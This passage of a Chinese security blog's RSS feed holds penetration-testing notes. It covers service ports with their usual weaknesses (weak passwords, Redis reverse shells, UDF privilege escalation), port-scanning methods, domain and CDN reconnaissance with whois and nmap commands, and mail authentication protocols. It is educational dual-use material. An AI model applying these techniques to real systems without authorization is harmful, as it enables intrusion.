&lt;p&gt;DNS 缓存投毒&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS 欺骗&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SPF / DMARC Check&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DDoS&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;DNS Query Flood&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS 反弹&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS 隧道&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DHCP 67/68&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;劫持 / 欺骗&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TFTP (69/TCP)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTP (80/TCP)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Kerberos (88/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主要用于监听 KDC 的票据请求&lt;/li&gt;
&lt;li&gt;用于进行黄金票据和白银票据的伪造&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;POP3 (110/TCP &amp;amp; 995/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;爆破&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RPC (135/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;wmic 服务利用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;NetBIOS (137/UDP &amp;amp; 138/UDP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未授权访问&lt;/li&gt;
&lt;li&gt;弱口令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;NetBIOS / Samba (139/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未授权访问&lt;/li&gt;
&lt;li&gt;弱口令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IMAP (143/TCP &amp;amp; 993/TCP)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SNMP (161/TCP &amp;amp; 161/UDP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Public 弱口令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LDAP (389/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用于域上的权限验证服务&lt;/li&gt;
&lt;li&gt;匿名访问&lt;/li&gt;
&lt;li&gt;注入&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTPS (443/TCP)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SMB (445/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows 协议簇，主要功能为文件共享服务&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net use \\192.168.1.1 /user:xxx\username password&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Linux Rexec (512/TCP &amp;amp; 513/TCP &amp;amp; 514/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;弱口令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Rsync (873/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未授权访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RPC (1025/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NFS 匿名访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java RMI (1090/TCP &amp;amp; 1099/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;反序列化远程命令执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MSSQL (1433/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;弱密码&lt;/li&gt;
&lt;li&gt;差异备份 GetShell&lt;/li&gt;
&lt;li&gt;SA 提权&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Oracle (1521/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;弱密码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;NFS (2049/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;权限设置不当&lt;/li&gt;
&lt;li&gt;&lt;code&gt;showmount &amp;lt;host&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ZooKeeper (2171/TCP &amp;amp; 2375/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无身份认证&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Docker Remote API (2375/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未限制 IP / 未启用 TLS 身份认证&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://docker.addr:2375/version&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MySQL (3306/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;弱密码&lt;/li&gt;
&lt;li&gt;日志写 WebShell&lt;/li&gt;
&lt;li&gt;UDF 提权&lt;/li&gt;
&lt;li&gt;MOF 提权&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RDP / Terminal Services (3389/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;弱密码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Postgres (5432/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;弱密码&lt;/li&gt;
&lt;li&gt;执行系统命令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;VNC (5900/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;弱密码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CouchDB (5984/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未授权访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;WinRM (5985/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows 对 WS-Management 的实现&lt;/li&gt;
&lt;li&gt;在 Vista 上需要手动启动，在 Windows Server 2008 中服务是默认开启的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Redis (6379/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无密码或弱密码&lt;/li&gt;
&lt;li&gt;绝对路径写 WebShell&lt;/li&gt;
&lt;li&gt;计划任务反弹 Shell&lt;/li&gt;
&lt;li&gt;写 SSH 公钥&lt;/li&gt;
&lt;li&gt;主从复制 RCE&lt;/li&gt;
&lt;li&gt;Windows 写启动项&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Kubernetes API Server (6443/TCP &amp;amp;&amp;amp; 10250/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;https://Kubernetes:10250/pods&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;JDWP (8000/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;远程命令执行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ActiveMQ (8061/TCP)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Jenkin (8080/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未授权访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Elasticsearch (9200/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;代码执行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://es.addr:9200/_plugin/head/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://es.addr:9200/_nodes&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Memcached (11211/TCP &amp;amp; 11211/UDP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未授权访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RabbitMQ (15672/TCP &amp;amp; 15692/TCP &amp;amp; 25672/TCP)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MongoDB (27017/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无密码或弱密码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Hadoop (50070/TCP &amp;amp; 50075/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未授权访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除了以上列出的可能出现的问题，暴露在公网上的服务若不是最新版，都可能存在已经公开的漏洞&lt;/p&gt;
&lt;h1 id=&#34;常见端口扫描技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见端口扫描技术&#34;&gt;#&lt;/a&gt; 常见端口扫描技术&lt;/h1&gt;
&lt;h2 id=&#34;全扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全扫描&#34;&gt;#&lt;/a&gt; 全扫描&lt;/h2&gt;
&lt;p&gt;扫描主机尝试使用三次握手与目标主机的某个端口建立正规的连接，若成功建立连接，则端口处于开放状态，反之处于关闭状态。&lt;/p&gt;
&lt;p&gt;全扫描实现简单，且以较低的权限就可以进行该操作。但是在流量日志中会有大量明显的记录。&lt;/p&gt;
&lt;h2 id=&#34;半扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#半扫描&#34;&gt;#&lt;/a&gt; 半扫描&lt;/h2&gt;
&lt;p&gt;半扫描也称 SYN 扫描，在半扫描中，仅发送 SYN 数据段，如果应答为 RST，则端口处于关闭状态，若应答为 SYN/ACK，则端口处于监听状态。不过这种方式需要较高的权限，而且现在的大部分防火墙已经开始对这种扫描方式做处理。&lt;/p&gt;
&lt;h2 id=&#34;fin扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fin扫描&#34;&gt;#&lt;/a&gt; FIN 扫描&lt;/h2&gt;
&lt;p&gt;FIN 扫描是向目标发送一个 FIN 数据包，如果是开放的端口，会返回 RST 数据包，关闭的端口则不会返回数据包，可以通过这种方式来判断端口是否打开。&lt;/p&gt;
&lt;p&gt;这种方式并不在 TCP 三次握手的状态中，所以不会被记录，相对 SYN 扫描要更隐蔽一些。&lt;/p&gt;
&lt;h1 id=&#34;web服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web服务&#34;&gt;#&lt;/a&gt; Web 服务&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Jenkins&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未授权访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Gitlab&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对应版本 CVE&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Zabbix&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;权限设置不当&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;批量搜索&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#批量搜索&#34;&gt;#&lt;/a&gt; 批量搜索&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Censys&lt;/li&gt;
&lt;li&gt;Shodan&lt;/li&gt;
&lt;li&gt;ZoomEye&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/information%20gathering/domain%20information/</guid>
            <title>域名信息</title>
            <link>https://mobius-0.github.io/security/WebNote/information%20gathering/domain%20information/</link>
            <category>域名</category>
            <category>信息收集</category>
            <category>搜索</category>
            <pubDate>Fri, 25 Nov 2022 16:54:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;whois&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#whois&#34;&gt;#&lt;/a&gt; Whois&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2hvaXMuY29tLw==&#34;&gt;Whois&lt;/span&gt; 可以查询域名是否被注册，以及注册域名的详细信息的数据库，其中可能会存在一些有用的信息，例如域名所有人、域名注册商、邮箱等。&lt;/p&gt;
&lt;h1 id=&#34;搜索引擎搜索&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索引擎搜索&#34;&gt;#&lt;/a&gt; 搜索引擎搜索&lt;/h1&gt;
&lt;p&gt;搜索引擎通常会记录域名信息，可以通过  &lt;code&gt;site: domain&lt;/code&gt;  的语法来查询。&lt;/p&gt;
&lt;h1 id=&#34;第三方查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第三方查询&#34;&gt;#&lt;/a&gt; 第三方查询&lt;/h1&gt;
&lt;p&gt;网络中有相当多的第三方应用提供了子域的查询功能，下面有一些例子，更多的网站可以在 8.1 工具列表 中查找。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v&#34;&gt;DNSDumpster&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20v&#34;&gt;Virustotal&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;CrtSearch&lt;/li&gt;
&lt;li&gt;threatminer&lt;/li&gt;
&lt;li&gt;Censys&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;asn信息关联&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#asn信息关联&#34;&gt;#&lt;/a&gt; ASN 信息关联&lt;/h1&gt;
&lt;p&gt;在网络中一个自治系统 (Autonomous System, AS) 是一个有权自主地决定在本系统中应采用何种路由协议的小型单位。这个网络单位可以是一个简单的网络也可以是一个由一个或多个普通的网络管理员来控制的网络群体，它是一个单独的可管理的网络单元 (例如一所大学，一个企业或者一个公司个体) 。&lt;/p&gt;
&lt;p&gt;一个自治系统有时也被称为是一个路由选择域 (routing domain) 。一个自治系统将会分配一个全局的唯一的 16 位号码，这个号码被称为自治系统号 (ASN) 。因此可以通过 ASN 号来查找可能相关的 IP，例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;whois -h whois.radb.net -- &#39;-i origin AS111111&#39; | grep -Eo &amp;quot;([0-9.]+)&amp;#123;4&amp;#125;/[0-9]+&amp;quot; | uniq
nmap --script targets-asn --script-args targets-asn.asn=15169
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;域名相关性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域名相关性&#34;&gt;#&lt;/a&gt; 域名相关性&lt;/h1&gt;
&lt;p&gt;同一个企业 / 个人注册的多个域名通常具有一定的相关性，例如使用了同一个邮箱来注册、使用了同一个备案、同一个负责人来注册等，可以使用这种方式来查找关联的域名。一种操作步骤如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查询域名注册邮箱&lt;/li&gt;
&lt;li&gt;通过域名查询备案号&lt;/li&gt;
&lt;li&gt;通过备案号查询域名&lt;/li&gt;
&lt;li&gt;反查注册邮箱&lt;/li&gt;
&lt;li&gt;反查注册人&lt;/li&gt;
&lt;li&gt;通过注册人查询到的域名在查询邮箱&lt;/li&gt;
&lt;li&gt;通过上一步邮箱去查询域名&lt;/li&gt;
&lt;li&gt;查询以上获取出的域名的子域名&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;网站信息利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网站信息利用&#34;&gt;#&lt;/a&gt; 网站信息利用&lt;/h1&gt;
&lt;p&gt;网站中有相当多的信息，网站本身、各项安全策略、设置等都可能暴露出一些信息。&lt;/p&gt;
&lt;p&gt;网站本身的交互通常不囿于单个域名，会和其他子域交互。对于这种情况，可以通过爬取网站，收集站点中的其他子域信息。这些信息通常出现在 JavaScript 文件、资源文件链接等位置。&lt;/p&gt;
&lt;p&gt;网站的安全策略如跨域策略、CSP 规则等通常也包含相关域名的信息。有时候多个域名为了方便会使用同一个 SSL/TLS 证书，因此有时可通过证书来获取相关域名信息。&lt;/p&gt;
&lt;h1 id=&#34;https证书&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#https证书&#34;&gt;#&lt;/a&gt; HTTPS 证书&lt;/h1&gt;
&lt;h2 id=&#34;证书透明度&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书透明度&#34;&gt;#&lt;/a&gt; 证书透明度&lt;/h2&gt;
&lt;p&gt;为了保证 HTTPS 证书不会被误发或伪造，CA 会将证书记录到可公开验证、不可篡改且只能附加内容的日志中，任何感兴趣的相关方都可以查看由授权中心签发的所有证书。因此可以通过查询已授权证书的方式来获得相关域名。&lt;/p&gt;
&lt;h2 id=&#34;san&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#san&#34;&gt;#&lt;/a&gt; SAN&lt;/h2&gt;
&lt;p&gt;主题备用名称 (Subject Alternate Name, SAN)，简单来说，在需要多个域名，并将其用于各项服务时，多使用 SAN 证书。SAN 允许在安全证书中使用 subjectAltName 字段将多种值与证书关联，这些值被称为主题备用名称。&lt;/p&gt;
&lt;h1 id=&#34;域传送漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域传送漏洞&#34;&gt;#&lt;/a&gt; 域传送漏洞&lt;/h1&gt;
&lt;p&gt;DNS 域传送 (zone transfer) 指的是冗余备份服务器使用来自主服务器的数据刷新自己的域 (zone) 数据库。这是为了防止主服务器因意外不可用时影响到整个域名的解析。&lt;/p&gt;
&lt;p&gt;一般来说，域传送操作应该只允许可信的备用 DNS 服务器发起，但是如果错误配置了授权，那么任意用户都可以获得整个 DNS 服务器的域名信息。这种错误授权被称作是 DNS 域传送漏洞。&lt;/p&gt;
&lt;h1 id=&#34;passive-dns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#passive-dns&#34;&gt;#&lt;/a&gt; Passive DNS&lt;/h1&gt;
&lt;p&gt;Passive DNS 被动的从递归域名服务器记录来自不同域名服务器的响应，形成数据库。利用 Passive DNS 数据库可以知道域名曾绑定过哪些 IP，IP 曾关联到哪些域名，域名最早 / 最近出现的时间，为测试提供较大的帮助。Virustotal、passivetotal、CIRCL 等网站都提供了 Passive DNS 数据库的查询。&lt;/p&gt;
&lt;h1 id=&#34;泛解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#泛解析&#34;&gt;#&lt;/a&gt; 泛解析&lt;/h1&gt;
&lt;p&gt;泛解析是把 *.example.com 的所有 A 记录都解析到某个 IP 地址上，在子域名枚举时需要处理这种情况以防生成大量无效的记录。&lt;/p&gt;
&lt;h1 id=&#34;重要记录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#重要记录&#34;&gt;#&lt;/a&gt; 重要记录&lt;/h1&gt;
&lt;h2 id=&#34;cname&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cname&#34;&gt;#&lt;/a&gt; CNAME&lt;/h2&gt;
&lt;p&gt;CNAME 即 Canonical name，又称 alias，将域名指向另一个域名。其中可能包含其他关联业务的信息。很多网站使用的 CDN 加速功能利用了该记录。&lt;/p&gt;
&lt;h2 id=&#34;mx记录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mx记录&#34;&gt;#&lt;/a&gt; MX 记录&lt;/h2&gt;
&lt;p&gt;MX 记录即 Mail Exchanger，记录了发送电子邮件时域名对应的服务器地址。可以用来寻找 SMTP 服务器信息。&lt;/p&gt;
&lt;h2 id=&#34;ns记录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ns记录&#34;&gt;#&lt;/a&gt; NS 记录&lt;/h2&gt;
&lt;p&gt;NS (Name Server) 记录是域名服务器的记录，用来指定域名由哪个 DNS 服务器来进行解析。&lt;/p&gt;
&lt;h2 id=&#34;spf记录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spf记录&#34;&gt;#&lt;/a&gt; SPF 记录&lt;/h2&gt;
&lt;p&gt;SPF (Sender Policy Framework) 是为了防止垃圾邮件而提出来的一种 DNS 记录类型，是一种 TXT 类型的记录，用于登记某个域名拥有的用来外发邮件的所有 IP 地址。通过 SPF 记录可以获取相关的 IP 信息，常用命令为  &lt;code&gt;dig example.com txt&lt;/code&gt;  。&lt;/p&gt;
&lt;h1 id=&#34;cdn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cdn&#34;&gt;#&lt;/a&gt; CDN&lt;/h1&gt;
&lt;h2 id=&#34;cdn验证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cdn验证&#34;&gt;#&lt;/a&gt; CDN 验证&lt;/h2&gt;
&lt;p&gt;可通过多地 ping 的方式确定目标是否使用了 CDN，常用的网站有  &lt;code&gt;http://ping.chinaz.com/&lt;/code&gt;   &lt;code&gt;https://asm.ca.com/en/ping.php&lt;/code&gt;  等。&lt;/p&gt;
&lt;h2 id=&#34;域名查找&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域名查找&#34;&gt;#&lt;/a&gt; 域名查找&lt;/h2&gt;
&lt;p&gt;使用了 CDN 的域名的父域或者子域名不一定使用了 CDN，可以通过这种方式去查找对应的 IP。&lt;/p&gt;
&lt;h2 id=&#34;历史记录查找&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#历史记录查找&#34;&gt;#&lt;/a&gt; 历史记录查找&lt;/h2&gt;
&lt;p&gt;CDN 可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实 IP。&lt;/p&gt;
&lt;h2 id=&#34;邮件信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#邮件信息&#34;&gt;#&lt;/a&gt; 邮件信息&lt;/h2&gt;
&lt;p&gt;通过社会工程学的方式进行邮件沟通，从邮件头中获取 IP 地址，IP 地址可能是网站的真实 IP 或者是目标的出口 IP。&lt;/p&gt;
&lt;h1 id=&#34;子域爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#子域爆破&#34;&gt;#&lt;/a&gt; 子域爆破&lt;/h1&gt;
&lt;p&gt;在内网等不易用到以上技巧的环境，或者想监测新域名上线时，可以通过批量尝试的方式，找到有效的域名。&lt;/p&gt;
&lt;h1 id=&#34;缓存探测技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#缓存探测技术&#34;&gt;#&lt;/a&gt; 缓存探测技术&lt;/h1&gt;
&lt;p&gt;在企业网络中通常都会配置 DNS 服务器为网络内的主机提供域名解析服务。域名缓存侦测（DNS Cache Snooping）技术就是向这些服务器发送域名解析请求，但并不要求使用递归模式，用于探测是否请求过某个域名。这种方式可以用来探测是否使用了某些软件，尤其是安全软件。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/information%20gathering/network%20io/</guid>
            <title>网络入口/信息</title>
            <link>https://mobius-0.github.io/security/WebNote/information%20gathering/network%20io/</link>
            <category>信息收集</category>
            <pubDate>Fri, 25 Nov 2022 16:44:06 +0800</pubDate>
            <description><![CDATA[ &lt;ul&gt;
&lt;li&gt;网络拓扑信息
&lt;ul&gt;
&lt;li&gt;外网出口&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IP 信息
&lt;ul&gt;
&lt;li&gt;C 段&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;线下网络
&lt;ul&gt;
&lt;li&gt;Wi-Fi
&lt;ul&gt;
&lt;li&gt;SSID&lt;/li&gt;
&lt;li&gt;认证信息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VPN
&lt;ul&gt;
&lt;li&gt;厂商&lt;/li&gt;
&lt;li&gt;登录方式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;邮件网关&lt;/li&gt;
&lt;li&gt;手机 APP&lt;/li&gt;
&lt;li&gt;小程序后台&lt;/li&gt;
&lt;li&gt;OA&lt;/li&gt;
&lt;li&gt;SSO&lt;/li&gt;
&lt;li&gt;边界网络设备&lt;/li&gt;
&lt;li&gt;上游运营商&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/mail/</guid>
            <title>邮件协议簇</title>
            <link>https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/mail/</link>
            <category>邮件</category>
            <category>网络协议</category>
            <pubDate>Fri, 25 Nov 2022 15:58:31 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;h2 id=&#34;smtp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#smtp&#34;&gt;#&lt;/a&gt; SMTP&lt;/h2&gt;
&lt;p&gt;SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用 SSL 时端口号为 25，启用 SSL 时端口号多为 465 或 994。&lt;/p&gt;
&lt;h2 id=&#34;pop3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pop3&#34;&gt;#&lt;/a&gt; POP3&lt;/h2&gt;
&lt;p&gt;POP3 (Post Office Protocol 3) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用 SSL 时端口号为 110，启用 SSL 时端口号多为 995。&lt;/p&gt;
&lt;h2 id=&#34;imap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#imap&#34;&gt;#&lt;/a&gt; IMAP&lt;/h2&gt;
&lt;p&gt;IMAP (Internet Mail Access Protocol)，即交互式邮件存取协议，它是跟 POP3 类似邮件访问标准协议之一。不同的是，开启了 IMAP 后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用 SSL 时端口号为 143，启用 SSL 时端口号多为 993。&lt;/p&gt;
&lt;h1 id=&#34;防护策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防护策略&#34;&gt;#&lt;/a&gt; 防护策略&lt;/h1&gt;
&lt;h2 id=&#34;spf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spf&#34;&gt;#&lt;/a&gt; SPF&lt;/h2&gt;
&lt;p&gt;发件人策略框架 (Sender Policy Framework, SPF) 是一套电子邮件认证机制，用于确认电子邮件是否由网域授权的邮件服务器寄出，防止有人伪冒身份网络钓鱼或寄出垃圾邮件。SPF 允许管理员设定一个 DNS TXT 记录或 SPF 记录设定发送邮件服务器的 IP 范围，如有任何邮件并非从上述指明授权的 IP 地址寄出，则很可能该邮件并非确实由真正的寄件者寄出。&lt;/p&gt;
&lt;h2 id=&#34;dkim&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dkim&#34;&gt;#&lt;/a&gt; DKIM&lt;/h2&gt;
&lt;p&gt;域名密钥识别邮件 (DomainKeys Identified Mail, DKIM) 是一种检测电子邮件发件人地址伪造的方法。发送方会在邮件的头中插入 DKIM-Signature，收件方通过查询 DNS 记录中的公钥来验证发件人的信息。&lt;/p&gt;
&lt;h2 id=&#34;dmarc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dmarc&#34;&gt;#&lt;/a&gt; DMARC&lt;/h2&gt;
&lt;p&gt;基于网域的消息认证、报告和一致性 (Domain-based Message Authentication, Reporting and Conformance, DMARC) 是电子邮件身份验证协议，用于解决在邮件栏中显示的域名和验证的域名不一致的问题。要通过 DMARC 检查，必须通过 SPF 或 / 和 DKIM 的身份验证，且需要标头地址中的域名必须与经过身份验证的域名一致。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
